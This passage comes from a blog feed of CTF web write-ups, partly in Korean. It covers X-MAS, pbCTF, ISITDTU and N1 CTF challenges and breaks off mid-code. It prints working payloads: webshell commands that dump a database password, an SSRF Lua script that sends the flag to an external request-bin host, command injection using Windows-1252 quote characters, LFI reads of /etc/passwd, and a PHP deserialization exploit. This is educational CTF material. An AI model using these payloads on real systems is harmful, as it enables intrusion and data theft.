src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/How%20Brutus%20stol/2.png?raw=true"><br>When I uploaded the webshell and accessed the file, I was able to confirm that the webshell was uploaded well.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;ls ~&#x2F;</span><br><span class="line">output &#x3D;&gt; ctfx</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;ls ~&#x2F;ctfx</span><br><span class="line">output &#x3D;&gt; composer.json composer.lock htdocs include install writable</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;ls ~&#x2F;ctfx&#x2F;include</span><br><span class="line">output &#x3D;&gt; Config.php cache.inc.php captcha.inc.php config config_loader.inc.php constants.inc.php db.inc.php email.inc.php files.inc.php general.inc.php json.inc.php language layout mellivora.inc.php raceconditions.inc.php session.inc.php thirdparty two_factor_auth.inc.php xsrf.inc.php</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;ls ~&#x2F;ctfx&#x2F;include&#x2F;config</span><br><span class="line">&#x3D;&gt; config.default.inc.php db.default.inc.php</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;cat ~&#x2F;ctfx&#x2F;include&#x2F;config&#x2F;db.default.inc.php</span><br><span class="line">output &#x3D;&gt; </span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> *</span><br><span class="line"> * This file contains default configuration.</span><br><span class="line"> *</span><br><span class="line"> *        DO NOT MAKE CHANGES HERE</span><br><span class="line"> *</span><br><span class="line"> * Copy this file and name it &quot;db.inc.php&quot;</span><br><span class="line"> * before making any changes. Any changes in</span><br><span class="line"> * db.inc.php will override the default</span><br><span class="line"> * config. It is also possible to override</span><br><span class="line"> * configuration options using environment</span><br><span class="line"> * variables. Environment variables override</span><br><span class="line"> * both the default settings and the hard-coded</span><br><span class="line"> * user defined settings.</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_ENGINE&#39;, &#39;mysql&#39;);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_HOST&#39;, &#39;localhost&#39;);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_PORT&#39;, 3306);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_NAME&#39;, &#39;mellivora&#39;);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_USER&#39;, &#39;mellivora&#39;);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_PASSWORD&#39;, &#39;rac9138cn98ascnascud&#39;);</span><br></pre></td></tr></table></figure><p>When I checked using a web shell, I could see that the Database configuration file exists. Then, let’s connect to the DB using the mysql command.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/How%20Brutus%20stol/3.png?raw=true"><br>[+] If you know the database name, user name, and password, you can run the query as above using the -e option of the mysql command and see the result immediately.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;mysql -D mellivora -u mellivora -prac9138cn98ascnascud -e &quot;show tables;&quot;</span><br><span class="line">output &#x3D;&gt; Tables_in_mellivora categories challenges cookie_tokens countries exceptions files hints ip_log news reset_password submissions two_factor_auth user_types users</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;mysql -D mellivora -u mellivora -prac9138cn98ascnascud -e &quot;select * from challenges&quot;</span><br><span class="line">output &#x3D;&gt; </span><br><span class="line">idaddedadded_bytitlecategorydescriptionexposedavailable_fromavailable_untilflagcase_insensitiveautomarkpointsinitial_pointsminimum_pointssolve_decaysolvesnum_attempts_allowedmin_seconds_between_submissionsrelies_on</span><br><span class="line">116060783851Brutus1Everyone hates Brutus! But does Brutus hate everyone? Who knows? Or rather, who cares?! What we care about here is the flag. Nothing more.</span><br><span class="line">\n</span><br><span class="line">\nLink: [url]http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050[&#x2F;url]115846992001617235206pwngyanctf&#123;we_dont_remember_the_actual_flag_:(&#125;01500500501002050</span><br><span class="line">216060810561Hard Challenge1Now it&#39;s time for a ramp-up in difficulty. You thought Brutus was hard? Ha! Check this one out then, punk.</span><br><span class="line">\n</span><br><span class="line">\nLink: [url]http:&#x2F;&#x2F;challs.xmas.htsp.ro:3051[&#x2F;url]115846992001617235206X-MAS&#123;Brutus_why_d1d_y0u_h4v3_t0_h4v3_RCE_113c41afe0&#125;01500500501000050</span><br><span class="line">316060811361Hello World!2Welcome to PWNgyan CTF 2020!</span><br><span class="line">\n</span><br><span class="line">\n[b]pwngyanctf&#123;H3ll0_H4ckerz_3141cc5f&#125;[&#x2F;b]115846992001617235206pwngyanctf&#123;H3ll0_H4ckerz_3141cc5f&#125;0110101013050</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>When I ran through the database using the mysql command, there was a flag of the table called challenges.</p><blockquote><p>FLAG : X-MAS{Brutus_why_d1d_y0u_h4v3_t0_h4v3_RCE_113c41afe0}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> PHP Object Injection </tag>
            
            <tag> Blind Command Injection </tag>
            
            <tag> Hash Length Extension Attack </tag>
            
            <tag> Type juggling </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pbCTF 2020 Write Up</title>
      <link href="2020/12/07/2020-12-07-pb-CTF/"/>
      <url>2020/12/07/2020-12-07-pb-CTF/</url>
      
        <content type="html"><![CDATA[<p>I participated by opening the CTF this time at Perfect Blue. Let’s write Write Up only for web challenges solved by CTF.</p><hr><h2 id="Web-Sploosh-156-pts"><a href="#Web-Sploosh-156-pts" class="headerlink" title=" (Web) Sploosh [156 pts]"></a><span style="color:#21C587"></span> (Web) Sploosh [156 pts]</h2><p>This time, we will solve a problem called Sploosh among web challenge from pbCTF.<br><img src="https://github.com/wjddnjs33/image/blob/main/pbCTF%202020/Sploosh/1.png?raw=true"><br>When you come into challenge, you can see that there is a form for entering the URL, and you can download the source code by clicking here.<br><br></p><p>Once you think about it before looking at the source code, you might be suspicious of <code>SSRF</code> because it has the ability to type in the url.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Type: application/json&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fail</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&#123;&#125;&quot;</span>;</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">  fail();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$url</span> === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">  fail();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="variable">$json</span> = file_get_contents(<span class="string">&quot;http://splash:8050/render.json?timeout=1&amp;url=&quot;</span> . urlencode(<span class="variable">$url</span>));</span><br><span class="line">  <span class="variable">$out</span> = <span class="keyword">array</span>(<span class="string">&quot;geometry&quot;</span> =&gt; json_decode(<span class="variable">$json</span>)-&gt;geometry);</span><br><span class="line">  <span class="keyword">echo</span> (<span class="variable">$out</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">  fail();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Let’s check the api.php source code. You can see that the url is input and the file is opened and checked with the file_get_contents() function. And you can see that the file value is output as the geometry value.<br><br><br><br>SSRF seems to be fired by the <code>file_get_contents()</code> function of api.php.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$FLAG</span> = getenv(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$remote_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$remote_ip</span> === <span class="string">&quot;172.16.0.13&quot;</span> || <span class="variable">$remote_ip</span> === <span class="string">&#x27;172.16.0.14&#x27;</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;No flag for you :)&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Let’s check the source code of flag.php. If the connection IP is <code>172.16.0.13</code> or <code>172.16.0.14</code>, you can see the flag is given.</p><p>And looking at the flag.php source code, you can see that the flag is only output on the internal server. So it looks like we need to put the flag in a specific variable and bring it to our private server.</p><p>Now I’ve searched for Sploosh to do an exploit. If you check <a href="https://splash.readthedocs.io/en/stable/scripting-tutorial.html#scripting-tutorial">Sploosh’s official homepage</a>, you find that you can create and run Lua scripts by connecting to the <code>execute</code> endpoint.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/pbCTF%202020/Sploosh/2.png?raw=true"></p><p>The picture above is on the official Sploosh website. Looking at the contents, you can see that the <code>execute</code> endpoint sends the RCE payload using the lua_source parameter.</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span><span class="params">(exploit, args)</span></span></span><br><span class="line">  exploit:go(<span class="string">&quot;http://172.16.0.14/flag.php&quot;</span>)</span><br><span class="line">  <span class="keyword">local</span> flag = splash:html()</span><br><span class="line">  exploit:go(<span class="string">&quot;requestbin&quot;</span> .. flag)</span><br><span class="line">  <span class="keyword">return</span> &#123;geometry=data&#125;</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>So, I wrote the SSRF + RCE payload as above using the lua script.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag = requests.get(<span class="string">&quot;http://172.16.0.14/flag.php&quot;</span>)</span><br><span class="line">requests.get(<span class="string">&quot;requestbin&quot;</span>+flag)</span><br></pre></td></tr></table></figure><p>If the exploit code is interpreted in Python, it is as above.</p><p>Finally, if you connect and send the exploit code above to the excute endpoint, a flag will come to requestbin. (<code>URL encoding</code>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload : http%3A%2F%2Flocalhost%3A8050%2Fexecute%3Flua_source%3Dfunction%2520main%28splash%2C%2520args%29%2520splash%3Ago%28%2522http%3A%2F%2F172.16.0.14%2Fflag.php%2522%29%2520local%2520data%2520%3D%2520splash%3Ahtml%28%29%2520splash%3Ago%28%2522https:&#x2F;&#x2F;66409bdd5f994b912d1a7f0f28d3b33f.m.pipedream.net%2F%2522%2520..%2520data%29%2520return%2520%7Bgeometry%3Ddata%7D%2520end</span><br></pre></td></tr></table></figure><p>So, I’ll URL-encode the exploit code and pass it over.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/pbCTF%202020/Sploosh/3.png?raw=true"></p><p>When I sent the above exploit payload, I could see the flag coming to the requestbin.</p><blockquote><p>FLAG : pbctf{1_h0p3_y0u_us3d_lua_f0r_th1s}</p></blockquote><hr><h2 id="Web-Apoche-I-58-pts"><a href="#Web-Apoche-I-58-pts" class="headerlink" title=" (Web) Apoche I [58 pts]"></a><span style="color:#21C587"></span> (Web) Apoche I [58 pts]</h2><p>This time, we will solve a challenge called Apoche I among web challenge from pbCTF.<br><img src="https://github.com/wjddnjs33/image/blob/main/pbCTF%202020/Apoche%20I/1.png?raw=true"><br>Looking at the challenge description, there are 5 URLs given. You can connect to an open server among 5 servers. (Some servers are closed.)</p><p>And looking at the hint, it says to get information about the binary.<br><img src="https://github.com/wjddnjs33/image/blob/main/pbCTF%202020/Apoche%20I/2.png?raw=true"><br>I connected to 34.68.159.75:41521, and when I checked the robots.txt file, I could see that there is a secret directory. I thought LFI would happen here, so I grabbed a proxy and attempted an LFI attack.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/pbCTF%202020/Apoche%20I/3.png?raw=true"><br>When I grabbed the request using Burp Suite and accessed the <code>/etc/passwd</code> file, I could see that the <code>LFI</code> worked well.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/pbCTF%202020/Apoche%20I/4.png?raw=true"><br>So I accessed <code>/proc/self/exe</code> to get the <code>binary file</code>, and when I searched for <code>pbctf&#123;</code>, I could see that the binary file had a flag.</p><blockquote><p>FLAG : pbctf{n0t_re4lly_apache_ap0che!}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Path Traversal </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISITDTU CTF 2020 Write Up</title>
      <link href="2020/10/14/2020-10-14-ISITDTU-CTF-2020/"/>
      <url>2020/10/14/2020-10-14-ISITDTU-CTF-2020/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-Unexploitable-984-pts"><a href="#Web-Unexploitable-984-pts" class="headerlink" title="(Web) Unexploitable [984 pts]"></a>(Web) Unexploitable [984 pts]</h2><blockquote><p>Unexploitable 문제는 Command Injection 문제입니다. </p></blockquote><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/bBTsc9/btqKTFXChn9/wZaECUxbarmKUIG078oke1/img.png"></p><p>문제로 들어오면 위처럼 Debug 모드로 들어갈 수 있는 링크가 존재합니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line">set_time_limit(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;debug&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$host</span> = remove_quot(<span class="variable">$host</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$san_host</span> = escapeshellcmd(<span class="variable">$host</span>);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;powershell -Command ping -n 1 &#x27;<span class="subst">$san_host</span>&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;a href=<span class="string">&quot;?debug&quot;</span>&gt;Debug&lt;/a&gt; Debug</span><br></pre></td></tr></table></figure><p>그래서 일단 Debug 모드로 들어오니 PHP 코드가 보이는 것을 볼 수 있습니다. 코드를 보면 host 값을 가져와서 remove_quot() 함수를 이용해서 모든 쿼터들을 제거하고, escapeshellcmd() 함수를 이용해서 특수 문자 앞에 슬래쉬를 붙여 $san_host 변수에 넣어주는 것을 볼 수 있습니다.</p><p>그리고 마지막으로 system() 함수를 실행시키는 데 이때 저희가 입력한 값이 들어가는 것을 볼 수 있습니다. 여기서 저는 <code>Command Injection</code> 문제라고 생각했습니다.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/xgfaO/btqKRNWmmGI/MKWWaBxMOhVtTCDK8dSNk0/img.png"></p><p>하지만 필터링에 의해서 싱글 쿼터를 사용할 수 없기 때문에 ping 명령어를 탈출할 수 없었습니다. 그러다가 우연히 문제 <code>Domain</code>만 치고 들어가니 해당 서버가 <code>windows server</code>인 <code>iis</code>를 사용하고 있는 것을 알 수 있었습니다.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/ArYWb/btqKOB3u5Fo/sKRkzkc5MkgB09kZex9DgK/img.png"></p><p>그래서 윈도우 서버 특수 문자를 키워드로 검색을 해보니 <code>windows-1252</code> 방식으로 이루어진 특수 문자가 존재하는 것을 볼 수 있었습니다. 위 사진을 보시면 82, 91, 92는 싱글 쿼터를 대체할 수 있는 거 같고, 84, 93, 94는 더블 쿼터를 대체할 수 있는 거 같습니다.</p><p>한 번 이를 이용해서 ping 명령어를 탈출해서 다른 명령어를 실행시켜보겠습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -Command ping -n 1 &#39;141.164.55.161&#39;; ls &#39;&#39;</span><br></pre></td></tr></table></figure><p>위와 같이 만들어주면 ping 명령어가 실행되고 나서 ls 명령어가 실행이 될 것입니다.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/b8aQeq/btqKShpoFPE/Abj0m62SOGD6Nrk3ZwiOhK/img.png"></p><p>저는 82, 91, 92 중에서 92를 사용해서 싱글 쿼터를 대체하고, 이를 이용해서 ls 명령어를 실행해보니 config.php, flag.php, index.php 파일이 존재하는 것을 알 수 있었습니다.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/bxipKP/btqKMz6dIb7/oTfMTrk2YXcfBYQMScrgc1/img.png"></p><p>마지막으로 cat 명령어를 이용해서 <code>flag.php</code> 파일을 읽어보니 FLAG가 들어있는 것을 볼 수 있었습니다. 이번 문제를 풀면서 처음으로 IIS 서버에서 싱글 쿼터를 우회하는 방법을 알게 되었고, windows-1252 인코딩 방식이 있다는 것도 알 수 있었습니다.</p><blockquote><p>FLAG : ISITDTU{6d77c41b70c235d1b077ad65e274a3c948bf56eb}</p></blockquote><hr><h2 id="Web-Warmup-XXX-pts"><a href="#Web-Warmup-XXX-pts" class="headerlink" title="(Web) Warmup [XXX pts]"></a>(Web) Warmup [XXX pts]</h2><blockquote><p>Warmup 문제는 간단한 PHP Object Injection 였는데 엄청난 실수로 풀지 못 했습니다.</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        unserialize(<span class="variable">$password</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>해당 문제로 들어오게 되면 위와 같은 PHP 코드가 보이는 것을 볼 수 있습니다. 일단 입력값을 <code>unserialize()</code> 메서드를 이용해서 역직렬화를 해주는 것을 보아  <code>PHP Object Injection</code>이라고 생각이 들었습니다. 하지만 <code>__wakeup()</code> 함수를 처음 보아서 이와 관련해서 조금 검색을 해보았습니다. </p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/cqno3T/btqKTG3qpro/jncPfrlLytMkGCkoyKjuWk/img.png"></p><p>검색을 해보니 <code>__wakeup()</code> 함수가 사용된 문제들이 많이 출제됐던 거 같습니다. 저만 이번에 처음 보는 거군요. 여하튼 위를 이용해서 <code>PHP Object Injection</code> 공격을 시도했습니다. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">path = <span class="built_in">input</span>(<span class="string">&quot;File Nmae : &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> path == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">path_len = <span class="built_in">len</span>(path)</span><br><span class="line">url = <span class="string">&#x27;http://35.220.140.18:5000/?username=&amp;password=O:4:&quot;Read&quot;:1:&#123;s:4:&quot;flag&quot;;s:&#x27;</span> + <span class="built_in">str</span>(path_len) + <span class="string">&#x27;:&quot;&#x27;</span> + path  +<span class="string">&#x27;&quot;;&#125;&#x27;</span></span><br><span class="line">res = requests.get(url)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>위와 같이 익스플로잇 코드를 작성해서 <code>/etc/passwd</code>, 아파치 설정 파일과 같은 것들을 모두 뒤져보았지만 결국 플래그를 획득하지 못 했습니다.</p><p>그러다가 오늘 오후 12시 45분쯤에 갑자기 생각이 나서 아는 분께 여쭤보니. robots.txt 파일에 플래그 파일이 있다고 하셨습니다. 너무 허무했습니다.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/dneNEx/btqKROgS2KF/PCkQfbI9xsTU4Nxo1k1knK/img.png"></p><p>그래서 robots.txt 파일을 확인해 보니 <code>fl4g.php</code> 파일인 것을 알 수 있었습니다 :( fl4g.php 파일을 릭해 플래그를 획득할 수 있었습니다.</p><blockquote><p>FLAG : ISITDTU{4re_y0u_w4rm?}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Command Injection </tag>
            
            <tag> PHP Object Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>N1 CTF 2020 Write Up</title>
      <link href="2020/10/14/2020-10-19-N1-CTF.2020/"/>
      <url>2020/10/14/2020-10-19-N1-CTF.2020/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-SignIn-138-pts"><a href="#Web-SignIn-138-pts" class="headerlink" title="(Web) SignIn [138 pts]"></a>(Web) SignIn [138 pts]</h2><blockquote><p>SignIn 문제는 PHP Object Injection과 SQL Injection을 이용해서 플래그를 획득하는 문제입니다.</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ip</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$info</span></span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span 